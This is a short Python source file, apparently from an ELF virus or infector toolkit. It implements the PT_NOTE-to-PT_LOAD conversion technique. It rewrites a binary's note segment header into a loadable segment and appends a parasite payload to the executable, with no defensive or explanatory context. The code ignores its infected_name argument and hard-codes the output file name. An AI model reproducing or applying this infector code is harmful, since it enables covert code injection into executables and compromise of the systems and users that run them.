from infections.infector import Infector
from ELF.elf import Elf
from ELF.elf_utils import get_data_phdr, get_note_phdr, PT_LOAD
from mmap import PAGESIZE

class NoteInfector(Infector):

	def infect(self, elf_obj, infected_name, payload):

		print('[*] PT_NOTE to PT_LOAD Conversion infection.')
		print('[1] Getting data segment phdr.\n')
		data_phdr = get_data_phdr(elf_obj.phdrs)

		ds_end_addr = data_phdr['p_vaddr'] + data_phdr['p_memsz']
		align_size = data_phdr['p_align']
		parasite_size = len(payload)

		note_phdr = get_note_phdr(elf_obj.phdrs)
		note_phdr['p_type'] = PT_LOAD

		note_phdr['p_vaddr'] = ds_end_addr + align_size
		note_phdr['p_paddr'] = ds_end_addr + align_size
		note_phdr['p_filesz'] = parasite_size
		note_phdr['p_memsz'] = parasite_size
		note_phdr['p_offset'] = len(elf_obj.file_content)
		note_phdr['p_align'] = data_phdr['p_align']

		elf_obj.file_content += payload
		elf_obj.save_as('new_simple')
